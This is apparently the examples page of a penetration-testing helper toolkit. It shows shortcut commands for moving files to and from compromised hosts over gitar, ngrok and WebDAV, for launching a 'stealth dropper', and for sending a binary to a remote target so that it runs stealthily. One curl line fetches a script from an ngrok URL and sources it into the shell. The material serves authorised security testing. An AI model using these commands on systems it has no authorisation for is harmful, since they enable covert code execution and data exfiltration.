# Examples

Some examples of bang usage

## `gitar`

### Share files

Start file sharing:
```
bang.gitar $AA $AP
```
This will start a `gitar` http server and copy to your clipboard a command line to run on remote. Run it, you can now upload and download file from remote easily (without further installations [see](https://github.com/ariary/gitar/blob/main/README.md#tldr---and-listen-music)). 

### Share files safely

Same as above + inside a container + using https for encryption

Start safe file sharing:
```
bang.gitar-safe $AA $AP
```

### Expose local file on internet

`ngrok` enable us to share local port on the internet. The idea is to start `gitar` server locally and then expose the local port on internet using `ngrok`

#### "Safe" version
***~>*** Expose local **HTTPS server** running in a **container**

1. Expose the server port on internet: `bang.expose-https 9237`
`ngrok` output the internet reachable address for your server. Note it (use `https` one preferably)
2. Start `gitar` HTTPS server in container: `bang.gitar-safe-override [NGROK_HTTPS_URL]`

If you have a browser you could now access to files on `[NGROK_HTTPS_URL]/pull`

If you have a shell you could load shortcut to upload/download file with:
```bash
curl -s [NGROK_HTTPS_URL]/alias > /tmp/alias && source /tmp/alias && rm /tmp/alias
```

#### "Unsafe" version
***~>*** Expose local **HTTP server**

1. Expose the server port on internet: `bang.expose 9237`
`ngrok` output the internet reachable address for your server. Note it (use `https` one preferably)
2. Start `gitar` HTTP server : `bang.gitar-override [NGROK_HTTPS_URL]`

If you have a browser you could now access to files on `[NGROK_HTTPS_URL]/pull`

If you have a shell you could load shortcut to upload/download file with:
```bash
curl -s [NGROK_HTTPS_URL]/alias > /tmp/alias && source /tmp/alias && rm /tmp/alias
```

*Notes: You could also use `python3 -m http.server 9237` to launch a server (only for "download file" use case)*

## `fileless-xec`

### Copy line to launch `fieleless-xec` stealth dropper

This will copy command line on your clipboard to launch fileless-xec on remote. (Previously, uploaded it to the remote machine)

```
bang.flxscpy
```

### Send a local file to remote `fileless-xec` to stealthy run it

This will send a local binary to a remote listening `fileless-xec`. The binary will be then executed (stealthy) on remote

```
bang.flxssend [TARGET_IP] [TARGET_PORT] [binary]
```

## Webdav server

[see](https://blog.ropnop.com/docker-for-pentesters/#example-6---serving-files-over-webdav)

This enable us to share all files of current directory trough a webdav server

```
bang.webdavhere
```

You can now access file from a remote machine (Windows) with the UNC path: `\\[ATTACKER_ADDR]@[ATTACKER_PORT]\share`

You could eventually expose server behind a internet address using `ngrok` (if you are behdin an NAT for exemple):
```
bang.expose 8080
```
Access file: `\\[NGROK_URL]@\share`
